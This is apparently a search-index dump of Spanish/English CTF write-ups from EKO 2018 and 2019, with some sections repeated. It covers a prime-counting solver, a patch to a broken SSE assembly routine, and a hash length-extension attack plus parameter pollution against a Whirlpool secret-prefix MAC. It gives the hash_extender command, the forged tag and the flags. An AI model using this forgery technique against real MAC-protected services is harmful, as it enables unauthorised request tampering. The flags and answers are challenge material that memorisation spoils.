caminos: 1. Encontramos una tool para de-movfuscar el binario. 2. Hacemos uso del msj de la nota, y JUGAMOS en vez de tratar de romper el juego. Vamos a ir por la opci\u00f3n 2: Luego de probar un poco con algunos valores que ingresamos como respuestas, vamos a notar que: 1. Para 1, la respuesta es 1. 2. Para 2, la respuesta es 2. 3. Para 3, la respuesta es 1. 4. Para 4, la respuesta es 1. 5. Para 5, la respuesta es 2. 6. Para 6, la respuesta es 1. 7. Para 7, la respuesta es 2. 8. Para 8, la respuesta es 1. 9. Para 9, la respuesta es 2. 10. Para 10, la respuesta es 3. 11. Para 11, la respuesta es 4. 12. Para 12, la respuesta es 1. Si observamos con detalle, podemos ver que el la respuesta es un numero que empieza a aumentar pero en ciertos valores vuelve a uno. Dichos valores son: 2, 3, 5, 7, 11, etc. Es decir, parece ser un contador que cuando el n\u00famero de la pregunta es uno de esos, el contador se resetea y vuelve a empezar de 1. Pero \u00bfQu\u00e9 tienen de com\u00fan estos n\u00fameros? SON PRIMOS!! Todav\u00eda no sabemos qu\u00e9 cantidad de preguntas hay, pero igualmente, podemos hacer un script que imprima un contador y que cada vez que se cruza con un n\u00famero primo, vuelva a 1. Dado que no sabemos la cantidad, podemos ir probando hasta que la encontremos. Yo arranqu\u00e9 con 15, y faltaban mas. Mi siguiente paso fue probar con 1000, y funcion\u00f3. La cantidad de preguntas finalmente eran 100.","title":"Play for the key"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#solucionador","text":"primos = [] contador = 1 numero_de_pregunta = 1 posible_numero_de_preguntas = 1000 for numero_de_pregunta in xrange(1,posible_numero_de_preguntas): print contador if any((numero_de_pregunta % primo) == 0 for primo in primos) or numero_de_pregunta == 1: contador += 1 else: contador = 1 primos.append(numero_de_pregunta)","title":"Solucionador"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#intento-con-15-primos","text":"","title":"Intento con 15 primos"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#intento-con-1000-primos","text":"Si intentamos descomprimir el ZIP con esa clave, vamos a obtener un \u00faltimo file simd.asm , que es la \u00faltima parte del challenge.","title":"Intento con 1000 primos"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#parte-3-programacion-en-assembler","text":"La \u00faltima parte del challenge implica tratar de entender qu\u00e9 hizo el atacante (qu\u00e9 modific\u00f3) para poder volver hacer que funcione otra vez. El file original contiene: nasm -f elf64 simd.asm; ld -o simd simd.o section .text global _start _start: movdqu xmm1, [Parallel_processing] movdqu xmm3, [is_much_faster...You_know?] movdqu xmm5, [but_sometimes_is_difficult] movdqu xmm7, [to_understand_how_it_works.] movdqu xmm10, [Anyways_I_trust_you...] movdqu xmm2, xmm1 movdqu xmm4, xmm3 movdqu xmm6, xmm5 movdqu xmm8, xmm7 movdqu xmm11, xmm10 pxor xmm9, xmm9 punpckhwd xmm1, xmm9 punpckhwd xmm2, xmm9 punpcklwd xmm3, xmm9 punpckhwd xmm4, xmm9 punpcklwd xmm5, xmm9 punpcklwd xmm6, xmm9 punpcklwd xmm7, xmm9 punpckhwd xmm8, xmm9 punpcklwd xmm10, xmm9 punpckhwd xmm9 ,xmm11 psubw xmm1, xmm10 psubw xmm2, xmm11 psubw xmm3, xmm10 psubw xmm4, xmm11 psubw xmm5, xmm10 psubw xmm6, xmm11 psubw xmm7, xmm10 psubw xmm8, xmm11 packuswb xmm1, xmm2 packuswb xmm3, xmm4 packuswb xmm5, xmm6 packuswb xmm7, xmm8 movdqu [Parallel_processing], xmm1 movdqu [is_much_faster...You_know?], xmm3 movdqu [but_sometimes_is_difficult], xmm5 movdqu [to_understand_how_it_works.], xmm7 mov ecx, Parallel_processing mov edx, 0x40 mov ebx,1 mov eax,4 int 0x80 mov eax,1 int 0x80 section .data Parallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e is_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e but_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f to_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b Anyways_I_trust_you... dq 0x1715ABADFACEBABE Whats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE Lo m\u00e1s imporante ac\u00e1 es entender qu\u00e9 est\u00e1 haciendo este c\u00f3digo, al menos una idea a alto nivel para despu\u00e9s ahondar en cada detalle. Dividamos el c\u00f3digo en partes:","title":"Parte 3: Programaci\u00f3n en assembler"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-1","text":"movdqu xmm1, [Parallel_processing] movdqu xmm3, [is_much_faster...You_know?] movdqu xmm5, [but_sometimes_is_difficult] movdqu xmm7, [to_understand_how_it_works.] movdqu xmm10, [Anyways_I_trust_you...] movdqu xmm2, xmm1 movdqu xmm4, xmm3 movdqu xmm6, xmm5 movdqu xmm8, xmm7 movdqu xmm11, xmm10 pxor xmm9, xmm9 En esta parte, simplemente est\u00e1 copiando el contenido de las etiquetas a los registros XMM (16 bytes). Luego, hace una de cada una de ellos, dejando el mismo contenido de a pares. Es decir, xmm1 tiene el mismo valor que xmm2 , xmm3 el mismo que xmm4 , etc.. Por \u00faltimo, xmm9 lo pone en 0.","title":"An\u00e1lisis de c\u00f3digo - Parte 1"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-2","text":"punpckhwd xmm1, xmm9 punpckhwd xmm2, xmm9 punpcklwd xmm3, xmm9 punpckhwd xmm4, xmm9 punpcklwd xmm5, xmm9 punpcklwd xmm6, xmm9 punpcklwd xmm7, xmm9 punpckhwd xmm8, xmm9 punpcklwd xmm10, xmm9 punpckhwd xmm9 ,xmm11 En esta segunda parte, se puede observar dos instrucciones distintas: * punpckhwd * punpcklwd \u00c9stas, son parte de un conjunto de instrucciones (SSE) usados para procesamiento paralelo. Googleando un poco, se puede encontrar que la funci\u00f3n punpckhwd divide los registros, tanto fuente como destino, en words (2 bytes) (por eso la ante \u00faltima letra, w ). Toma las words que est\u00e1n en la parte high (por eso la letra h antes de la w ) de ambos registros, y los intercala. Lo imporante de esta parte, no es tanto entrar en detalle de c\u00f3mo es que se intercalan estrictamente, sino m\u00e1s que nada entender que: Se est\u00e1 unpackeando words Se est\u00e1 unpackeando o bien la parte high, o bien la parte low. Casi todas ellas se est\u00e1n unpackeando con 0 ( xmm9 es 0). Si recordamos lo que se hizo en la primera parte, hab\u00eda pares de registros xmm que tenian el mismo valor. Si bien vemos casos en la parte 2, donde se est\u00e1 unpackeando la parte high y low de un mismo valor de registros (por ejemplo, para xmm3 y xmm4 ), tambi\u00e9n vemos casos donde se hace dos veces la parte high ( xmm1 y xmm2 ). Raro.. Adem\u00e1s, vemos que la \u00faltima intrucci\u00f3n, parece unpackear al rev\u00e9s, es decir, usando el xmm9 como registro fuente y no como destino. Otra cosa para anotar.","title":"An\u00e1lisis de c\u00f3digo - Parte 2"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-3","text":"psubw xmm1, xmm10 psubw xmm2, xmm11 psubw xmm3, xmm10 psubw xmm4, xmm11 psubw xmm5, xmm10 psubw xmm6, xmm11 psubw xmm7, xmm10 psubw xmm8, xmm11 Otra instrucci\u00f3n del mismo set de procesamiento paralelo. En este caso esta instrucci\u00f3n hace una resta word a word de cada registro y almacena el resultado en el registro destino. Obsevado este pedazo de c\u00f3digo, se puede intuir que ni xmm11 ni xmm10 son usados dos veces con el mismo par de registros. Es decir, todo par de registros usa una vez xmm10 y una vez xmm11 . De hecho, por el orden y lo n\u00fameros de regitros, podr\u00edamos llegar a pensar que xmm10 es siempre usado para la parte low de los pares de registros y xmm11 para la parte high .","title":"An\u00e1lisis de c\u00f3digo - Parte 3"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-4","text":"packuswb xmm1, xmm2 packuswb xmm3, xmm4 packuswb xmm5, xmm6 packuswb xmm7, xmm8 Por \u00faltimo, en esta parte, se hace el packeo otra vez para volver a la \"normalidad\". Cada par de registros, se packean juntos. Sin embargo, dicho packeo, se hace de word a byte (por eso wb a lo \u00faltimo) cuando el unpackeo se hizo de word a double word... raro..","title":"An\u00e1lisis de c\u00f3digo - Parte 4"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-5","text":"movdqu [Parallel_processing], xmm1 movdqu [is_much_faster...You_know?], xmm3 movdqu [but_sometimes_is_difficult], xmm5 movdqu [to_understand_how_it_works.], xmm7 Se escribe dichas posiciones de memoria el valor que tienen algunos (los representantes de cada par?) de los xmm despu\u00e9s de hacer las operaciones.","title":"An\u00e1lisis de c\u00f3digo - Parte 5"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-6","text":"mov ecx, Parallel_processing mov edx, 0x40 mov ebx,1 mov eax,4 int 0x80 mov eax,1 int 0x80 Finalmente, imprime por pantalla los 64 bytes que tenga la posici\u00f3n de memoria apuntada por la etiqueta Parallel_processing .","title":"An\u00e1lisis de c\u00f3digo - Parte 6"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-resumen","text":"Hay al menos 3 cosas que parecen raras: En el momemto de unpackear, hay algunos pares de registros que se unpackea la misma parte (high o low). En una instrucci\u00f3n de unpackeo, se usa el xmm9 como registro destino (no consistente con todo lo anterior). En el momento de packear, si bien se hab\u00eda unpackeado de word a double word, se packea de word a byte. Al ser un ejercicio de \"patching\", no queda otra que ir probando los cambios a ver como afectan. Igualmente, as\u00ed como fuimos intuyendo a lo largo del texto, podr\u00edamos hacer los cambios para l\u00f3gicos: Cada par deberia unpackear la parte low y la parte high. C\u00f3mo saber cual deber\u00eda, podr\u00edamos probar. Sin embargo, por c\u00f3mo est\u00e1 escrito el c\u00f3digo, vamos a optar por unpackear la parte low con el registro de numero m\u00e1s bajo entre los pares (es decir, entre xmm1 y xmm2 , usaremos xmm1 ) y el de n\u00famero m\u00e1s alto para la parte high: punpcklwd xmm1, xmm9 punpckhwd xmm2, xmm9 punpcklwd xmm3, xmm9 punpckhwd xmm4, xmm9 punpcklwd xmm5, xmm9 punpckhwd xmm6, xmm9 punpcklwd xmm7, xmm9 punpckhwd xmm8, xmm9 punpcklwd xmm10, xmm9 punpckhwd xmm11, xmm9 xmm9 no tiene mucho sentido ponerlo adelante, adem\u00e1s de que parece inconsistente con todas las otras, por lo tanto, cambiemos el orden. y dejemos que la instrucci\u00f3n sea: punpckhwd xmm11, xmm9 Probemos. Packemos de double word a word, usando la instrucci\u00f3n packusdw : packusdw xmm1, xmm2 packusdw xmm3, xmm4 packusdw xmm5, xmm6 packusdw xmm7, xmm8 Es decir, que finalmente, el nuevo c\u00f3digo ser\u00eda: ; nasm -f elf64 simd.asm; ld -o simd simd.o section .text global _start _start: movdqu xmm1, [Parallel_processing] movdqu xmm3, [is_much_faster...You_know?] movdqu xmm5, [but_sometimes_is_difficult] movdqu xmm7, [to_understand_how_it_works.] movdqu xmm10, [Anyways_I_trust_you...] movdqu xmm2, xmm1 movdqu xmm4, xmm3 movdqu xmm6, xmm5 movdqu xmm8, xmm7 movdqu xmm11, xmm10 pxor xmm9, xmm9 punpcklwd xmm1, xmm9 punpckhwd xmm2, xmm9 punpcklwd xmm3, xmm9 punpckhwd xmm4, xmm9 punpcklwd xmm5, xmm9 punpckhwd xmm6, xmm9 punpcklwd xmm7, xmm9 punpckhwd xmm8, xmm9 punpcklwd xmm10, xmm9 punpckhwd xmm11, xmm9 psubw xmm1, xmm10 psubw xmm2, xmm11 psubw xmm3, xmm10 psubw xmm4, xmm11 psubw xmm5, xmm10 psubw xmm6, xmm11 psubw xmm7, xmm10 psubw xmm8, xmm11 packusdw xmm1, xmm2 packusdw xmm3, xmm4 packusdw xmm5, xmm6 packusdw xmm7, xmm8 movdqu [Parallel_processing], xmm1 movdqu [is_much_faster...You_know?], xmm3 movdqu [but_sometimes_is_difficult], xmm5 movdqu [to_understand_how_it_works.], xmm7 mov ecx, Parallel_processing mov edx, 0x40 mov ebx,1 mov eax,4 int 0x80 mov eax,1 int 0x80 section .data Parallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e is_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e but_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f to_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b Anyways_I_trust_you... dq 0x1715ABADFACEBABE Whats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE Si compilamos este programa y lo corremos, obtendremos el flag: The flag is:ona{0db234f102901d6c789c2023A11600022e9fa1c9}","title":"An\u00e1lisis de c\u00f3digo - Resumen"},{"location":"ctfs/own/eko2019/defuse_bomb/","text":"Defuse the bomb Description Category: Cryptography Points: 250 / 500 Goal: Be aware of the Merkle\u2013Damg\u00e5rd weaskness, called Length Extension Attack. Statement Un grupo apodado MonkeyBananas nos hacke\u00f3. En algun lado que no sabemos donde, dejaron una \"bomba\". No sabemos que hace esa \"bomba\", pero creemos que una vez que \"explote\" puede llegar a borrar todos los datos que tenemos almacenados en nuestros servidores. Necesitamos que nos ayudes a evitar que esto pase, tenemos s\u00f3lo 3 d\u00edas. Claramente, nos est\u00e1n poniendo a prueba.. nos dieron el c\u00f3digo de un servidor que hace de \"Interruptor\". Si enviamos el request correcto a ese servidor vamos a poder desactivar la bomba, pero.. no parece tan facil ya que est\u00e1n usando alg\u00fan tipo de algoritmo criptogr\u00e1fico para evitar que puedas cambiar los par\u00e1metros del request a gusto. No est\u00e1 el c\u00f3digo completo del servidor que recibe dicho request, pero nos aseguraron que con lo que nos pasaron es suficiente. De casualidad, uno de nuestros sistemas de defensa, pudo capturar el trafico de el request que hicieron ellos al interruptor para activar la alarma, espero que sirva de algo! El flag es el SHA1 del TAG que deber\u00edas mandar para desactivar la bomba. Suerte! =========================================================== A group called MonkeyBananas hacked us. They left a \"bomb\" somewhere, but we don't know wehere. Furthermore, we don't know what this \"bomb\" does, but we believe that once it \"blows\" its gonna delete all data stored in our servers. We need your help, we have only 3 days. Clearly, they're challenging us, due to they gave us the source code of a server which works as a \"switch\". If we send the correct request to that server we will be able to defuse the bomb, but... it doesn't seems that easy because they're using some kind of crypto algorithm to avoid arbitrary tampering the parameters. The source code is not complete, but they ensure us that in that file we have all we need. Fortunately, one of our defense systems, was able to capture the request that this guys sent to the \"switch\" when they activated the bomb, hope this is useful! The flag is the SHA1 of the TAG value you should submit in order to defuse the bomb. Good luck! File These are the files that were provided by MonkeyBananas: Server pseudocode #!/usr/bin/env python3 import urllib # NOOO! Alguien elimin\u00f3 esto! import %%%%%% as remolino class Server: def __init__(self): ... self.generate_mac_key() ... def generate_mac_key(self): self.mac_key = b\"Th1s1sS3cure4sH3ll\" + os.urandom(14) def check_tag(self, tag, params): decoded_params = urllib.parse.unquote_to_bytes(params) return tag == remolino.new(self.mac_key+decoded_params).hexdigest() def parse_params(self, body): return dict(param_value.split(\"=\") for param_value in body.split(\"&\")) def serve_for_ever(self): ... def doget(self, request): ... def dopost(self, request): ... ct = request.headers.get(\"Content-type\") if not form_urlencoded(ct.lower()): return error() tag = request.headers.get(\"Tag\") params = request.body() if self.check_tag(tag, params): params = parse_params(urllib.parse.unquote(params)) if params['action'] == 'activate': activate_bomb() elif params['action'] == 'defuse': defuse_bomb() else: .... else: return error() ... ... server = Server() server.serve_for_ever() Request POST /bombing HTTP/1.1 Host: www.dibombjasbinplanted.com Content-Type: application/x-www-form-urlencoded Tag: d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b User-Agent: Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285 Connection: keep-alive Accept: text/html,application/xhtml bombing=true&bananas=missing&action=activate&monkeys=ontheway Solution We received two files an HTTP request and the source code of the \"interruptor\" to defuse the bomb. The HTTP request shows how this hacker team did the activation of the bomb. They basically sent a POST request to the host where this interruptor was hosted. The most important parts of it are: The HTTP header Tag The body used. The body has a parameter called action which seems to be the one that really activates the bomb. Reading the pseudocode of the server, in particular the lines: if self.check_tag(tag, params): params = parse_params(urllib.parse.unquote(params)) if params['action'] == 'activate': activate_bomb() elif params['action'] == 'defuse': defuse_bomb() we can confirm, that the action=activate is the necessary parameter to activate the bomb. Therefore, if we manage to send action=defuse we would be able to defuse it!. However our problem is the check function self.check_tag(tag, params) . This function is taking as input, the tag header the parameters sent in the body and performs the following action: def check_tag(self, tag, params): decoded_params = urllib.parse.unquote_to_bytes(params) return tag == remolino.new(self.mac_key+decoded_params).hexdigest() First, it makes some url-decoding and then it compares the sent tag against the result of applying a function call remolino.new to the concatenation of a key and the sent (and decoded) parameters. Then it calculates the hexdigest of it, which indicates that this function is potentially related to some hashing algorithm. The key appended to the params, is partially known: self.mac_key = b\"Th1s1sS3cure4sH3ll\" + os.urandom(14) but still there are 14 bytes (112 bits) that are random. So there's no chance we can bruteforce that. remolino its a library but we cannot know which one, cause: # NOOO! Alguien elimin\u00f3 esto! import %%%%%% as remolino This is clearly the structure of a MAC (in fact the name self.mac_key it's a little spoiler). This means that if we want to send a message to the 'interruptor' we should also send the tag header with the value of applying the hash function to the parameters together with the key (that we don't have). Seems to be almost impossible. Let's try to guess which hashing algorithm they are using. From the example request, we can get the a valid tag : d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b This is the value of applying the hash function to \" \\<key> \"+\" bombing=true&bananas=missing&action=activate&monkeys=ontheway \" Let's how long this hash digest is: len(\"d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b\") 128 128 bytes as an output it's pretty long. I think that the most famous algorithm which it digest is of 128 bytes is sha-512. If you have a little background of crypto you may've already realize what you need to use here. If you lack of it, still, you may understand that you need to create a valid tag, but you need the MAC key for that, which seems to be impossible to retrieve. Unless there is another kind of attack to create a valid tag. The length extension attack is one of the most famous attacks known for hashes. It basically states that: If in a structure like hash_function(secret+data) = H , you know: Length of secret data H It is possible to create H2 which asserts that: hash_function(secret+data+data2) = H2 with data2 being some arbitrary data you want to append. In other words, knowing the previous hash value, the data that was used to hash and only the length of the secret appended, you can append any arbitrary data and a valid hash without never knowing the actual value of the secret. HOW?! I won't explain the full details of it, for that you can visit something like this link , or any other explaination of it. But in quick words this happens only in hashes that are based on some common techinique called Merkle\u2013Damg\u00e5rd. It basically divides the input in blocks and it process each block separately (it's really not separately because it has dependences of previous blocks). This technique has an internal state which is updated each time a new block is processed. The resulting hash value is the internal state after processing the final block. The length extension attack leverages this and continues from the last \"checkpoint\" (which was the internal state of the final block) and adds more data to it. The requirements of this attack seems to fit in our case, but we still have some issues: We don't know yet the actual hash function that is being used What data should we append ? For 1. we can make a search in google to see what hashes are vulnerable to this attack (or are based in Merkle\u2013Damg\u00e5rd, which is the same) and also have a 128 bytes of digest. The answer to this is: SHA512 WHIRPOOL Well at this moment we can continue with both algorithms doing the tests, but remember that parts?: import %%%%%% as remolino ... return tag == remolino.new(self.mac_key+decoded_params).hexdigest() ... \"remolino\" in spanish means \"whirpool\", so most probably the actual hash used is whirpool. For 2. we would want to send something like action=defuse , but we can't just send the data we want, but we have to append it. However, let's pay attention to the way the server reads the params: def parse_params(self, body): return dict(param_value.split(\"=\") for param_value in body.split(\"&\")) It basically creates a dictionary and updates it with each key value gathered from the body. This means that this way is vulnerable to HPP (Parameter Polution). Therefore we can add our parameter to the end part of the body and when the server process it first will assing the value activate to action but afterwards will overwrite this value with defuse and BINGO! Fortunately, we don't have to do all the forging (padding, etc) of the data we want to append. There are some tools that already exist and will make our life easier like hash extender . This tool will do all the job for us: -d holds the data that was hashed previously -s has the hash value of it (the valid tag) -a holds the data we want to append -f is the name of the algorithm we want to use -l is the length of the secret ./hash_extender -d \"bombing=true&bananas=missing&action=activate&monkeys=ontheway\" -s d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b -a \"&action=defuse\" -f whirlpool -l 32 Type: whirlpool Secret length: 32 New signature: f52a0a8b9899458985b7aad687763c5a4dd37d6ceebd49d131b92bd6416eba1781ffd31ba222d9a544d83a64f7c2b119262e58d576b5d645cae59d3dd352a09b New string: 626f6d62696e673d747275652662616e616e61733d6d697373696e6726616374696f6e3d6163746976617465266d6f6e6b6579733d6f6e74686577617980000000000000000000000000000000000000000000000000000000000000000002e826616374696f6e3d646566757365 We now have the new signature for our new body \"bombing=true&bananas=missing&action=activate&monkeys=ontheway&action=defuse\" which should be the way to defuse the bomb! If we get the sha1 of this output, we finally get the correct flag ONA{dcc78fb1416748d7f8eeb001342856e492cbd877} DISCLAIMER: This challenge was expecting to just append \"&action=defuse\". In a real scenario if you add even more data after like \"&action=defuse&blabla=blabla\", it would have worked anyways.","title":"Defuse the bomb"},{"location":"ctfs/own/eko2019/defuse_bomb/#defuse-the-bomb","text":"","title":"Defuse the bomb"},{"location":"ctfs/own/eko2019/defuse_bomb/#description","text":"Category: Cryptography Points: 250 / 500 Goal: Be aware of the Merkle\u2013Damg\u00e5rd weaskness, called Length Extension Attack.","title":"Description"},{"location":"ctfs/own/eko2019/defuse_bomb/#statement","text":"Un grupo apodado MonkeyBananas nos hacke\u00f3. En algun lado que no sabemos donde, dejaron una \"bomba\". No sabemos que hace esa \"bomba\", pero creemos que una vez que \"explote\" puede llegar a borrar todos los datos que tenemos almacenados en nuestros servidores. Necesitamos que nos ayudes a evitar que esto pase, tenemos s\u00f3lo 3 d\u00edas. Claramente, nos est\u00e1n poniendo a prueba.. nos dieron el c\u00f3digo de un servidor que hace de \"Interruptor\". Si enviamos el request correcto a ese servidor vamos a poder desactivar la bomba, pero.. no parece tan facil ya que est\u00e1n usando alg\u00fan tipo de algoritmo criptogr\u00e1fico para evitar que puedas cambiar los par\u00e1metros del request a gusto. No est\u00e1 el c\u00f3digo completo del servidor que recibe dicho request, pero nos aseguraron que con lo que nos pasaron es suficiente. De casualidad, uno de nuestros sistemas de defensa, pudo capturar el trafico de el request que hicieron ellos al interruptor para activar la alarma, espero que sirva de algo! El flag es el SHA1 del TAG que deber\u00edas mandar para desactivar la bomba. Suerte! =========================================================== A group called MonkeyBananas hacked us. They left a \"bomb\" somewhere, but we don't know wehere. Furthermore, we don't know what this \"bomb\" does, but we believe that once it \"blows\" its gonna delete all data stored in our servers. We need your help, we have only 3 days. Clearly, they're challenging us, due to they gave us the source code of a server which works as a \"switch\". If we send the correct request to that server we will be able to defuse the bomb, but... it doesn't seems that easy because they're using some kind of crypto algorithm to avoid arbitrary tampering the parameters. The source code is not complete, but they ensure us that in that file we have all we need. Fortunately, one of our defense systems, was able to capture the request that this guys sent to the \"switch\" when they activated the bomb, hope this is useful! The flag is the SHA1 of the TAG value you should submit in order to defuse the bomb. Good luck!","title":"Statement"},{"location":"ctfs/own/eko2019/defuse_bomb/#file","text":"These are the files that were provided by MonkeyBananas: Server pseudocode #!/usr/bin/env python3 import urllib # NOOO! Alguien elimin\u00f3 esto! import %%%%%% as remolino class Server: def __init__(self): ... self.generate_mac_key() ... def generate_mac_key(self): self.mac_key = b\"Th1s1sS3cure4sH3ll\" + os.urandom(14) def check_tag(self, tag, params): decoded_params = urllib.parse.unquote_to_bytes(params) return tag == remolino.new(self.mac_key+decoded_params).hexdigest() def parse_params(self, body): return dict(param_value.split(\"=\") for param_value in body.split(\"&\")) def serve_for_ever(self): ... def doget(self, request): ... def dopost(self, request): ... ct = request.headers.get(\"Content-type\") if not form_urlencoded(ct.lower()): return error() tag = request.headers.get(\"Tag\") params = request.body() if self.check_tag(tag, params): params = parse_params(urllib.parse.unquote(params)) if params['action'] == 'activate': activate_bomb() elif params['action'] == 'defuse': defuse_bomb() else: .... else: return error() ... ... server = Server() server.serve_for_ever() Request POST /bombing HTTP/1.1 Host: www.dibombjasbinplanted.com Content-Type: application/x-www-form-urlencoded Tag: d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b User-Agent: Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285 Connection: keep-alive Accept: text/html,application/xhtml bombing=true&bananas=missing&action=activate&monkeys=ontheway","title":"File"},{"location":"ctfs/own/eko2019/defuse_bomb/#solution","text":"We received two files an HTTP request and the source code of the \"interruptor\" to defuse the bomb. The HTTP request shows how this hacker team did the activation of the bomb. They basically sent a POST request to the host where this interruptor was hosted. The most important parts of it are: The HTTP header Tag The body used. The body has a parameter called action which seems to be the one that really activates the bomb. Reading the pseudocode of the server, in particular the lines: if self.check_tag(tag, params): params = parse_params(urllib.parse.unquote(params)) if params['action'] == 'activate': activate_bomb() elif params['action'] == 'defuse': defuse_bomb() we can confirm, that the action=activate is the necessary parameter to activate the bomb. Therefore, if we manage to send action=defuse we would be able to defuse it!. However our problem is the check function self.check_tag(tag, params) . This function is taking as input, the tag header the parameters sent in the body and performs the following action: def check_tag(self, tag, params): decoded_params = urllib.parse.unquote_to_bytes(params) return tag == remolino.new(self.mac_key+decoded_params).hexdigest() First, it makes some url-decoding and then it compares the sent tag against the result of applying a function call remolino.new to the concatenation of a key and the sent (and decoded) parameters. Then it calculates the hexdigest of it, which indicates that this function is potentially related to some hashing algorithm. The key appended to the params, is partially known: self.mac_key = b\"Th1s1sS3cure4sH3ll\" + os.urandom(14) but still there are 14 bytes (112 bits) that are random. So there's no chance we can bruteforce that. remolino its a library but we cannot know which one, cause: # NOOO! Alguien elimin\u00f3 esto! import %%%%%% as remolino This is clearly the structure of a MAC (in fact the name self.mac_key it's a little spoiler). This means that if we want to send a message to the 'interruptor' we should also send the tag header with the value of applying the hash function to the parameters together with the key (that we don't have). Seems to be almost impossible. Let's try to guess which hashing algorithm they are using. From the example request, we can get the a valid tag : d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b This is the value of applying the hash function to \" \\<key> \"+\" bombing=true&bananas=missing&action=activate&monkeys=ontheway \" Let's how long this hash digest is: len(\"d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b\") 128 128 bytes as an output it's pretty long. I think that the most famous algorithm which it digest is of 128 bytes is sha-512. If you have a little background of crypto you may've already realize what you need to use here. If you lack of it, still, you may understand that you need to create a valid tag, but you need the MAC key for that, which seems to be impossible to retrieve. Unless there is another kind of attack to create a valid tag. The length extension attack is one of the most famous attacks known for hashes. It basically states that: If in a structure like hash_function(secret+data) = H , you know: Length of secret data H It is possible to create H2 which asserts that: hash_function(secret+data+data2) = H2 with data2 being some arbitrary data you want to append. In other words, knowing the previous hash value, the data that was used to hash and only the length of the secret appended, you can append any arbitrary data and a valid hash without never knowing the actual value of the secret. HOW?! I won't explain the full details of it, for that you can visit something like this link , or any other explaination of it. But in quick words this happens only in hashes that are based on some common techinique called Merkle\u2013Damg\u00e5rd. It basically divides the input in blocks and it process each block separately (it's really not separately because it has dependences of previous blocks). This technique has an internal state which is updated each time a new block is processed. The resulting hash value is the internal state after processing the final block. The length extension attack leverages this and continues from the last \"checkpoint\" (which was the internal state of the final block) and adds more data to it. The requirements of this attack seems to fit in our case, but we still have some issues: We don't know yet the actual hash function that is being used What data should we append ? For 1. we can make a search in google to see what hashes are vulnerable to this attack (or are based in Merkle\u2013Damg\u00e5rd, which is the same) and also have a 128 bytes of digest. The answer to this is: SHA512 WHIRPOOL Well at this moment we can continue with both algorithms doing the tests, but remember that parts?: import %%%%%% as remolino ... return tag == remolino.new(self.mac_key+decoded_params).hexdigest() ... \"remolino\" in spanish means \"whirpool\", so most probably the actual hash used is whirpool. For 2. we would want to send something like action=defuse , but we can't just send the data we want, but we have to append it. However, let's pay attention to the way the server reads the params: def parse_params(self, body): return dict(param_value.split(\"=\") for param_value in body.split(\"&\")) It basically creates a dictionary and updates it with each key value gathered from the body. This means that this way is vulnerable to HPP (Parameter Polution). Therefore we can add our parameter to the end part of the body and when the server process it first will assing the value activate to action but afterwards will overwrite this value with defuse and BINGO! Fortunately, we don't have to do all the forging (padding, etc) of the data we want to append. There are some tools that already exist and will make our life easier like hash extender . This tool will do all the job for us: -d holds the data that was hashed previously -s has the hash value of it (the valid tag) -a holds the data we want to append -f is the name of the algorithm we want to use -l is the length of the secret ./hash_extender -d \"bombing=true&bananas=missing&action=activate&monkeys=ontheway\" -s d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b -a \"&action=defuse\" -f whirlpool -l 32 Type: whirlpool Secret length: 32 New signature: f52a0a8b9899458985b7aad687763c5a4dd37d6ceebd49d131b92bd6416eba1781ffd31ba222d9a544d83a64f7c2b119262e58d576b5d645cae59d3dd352a09b New string: 626f6d62696e673d747275652662616e616e61733d6d697373696e6726616374696f6e3d6163746976617465266d6f6e6b6579733d6f6e74686577617980000000000000000000000000000000000000000000000000000000000000000002e826616374696f6e3d646566757365 We now have the new signature for our new body \"bombing=true&bananas=missing&action=activate&monkeys=ontheway&action=defuse\" which should be the way to defuse the bomb! If we get the sha1 of this output, we finally get the correct flag ONA{dcc78fb1416748d7f8eeb001342856e492cbd877} DISCLAIMER: This challenge was expecting to just append \"&action=defuse\". In a real scenario if you add even more data after like \"&action=defuse&blabla=blabla\", it would have worked 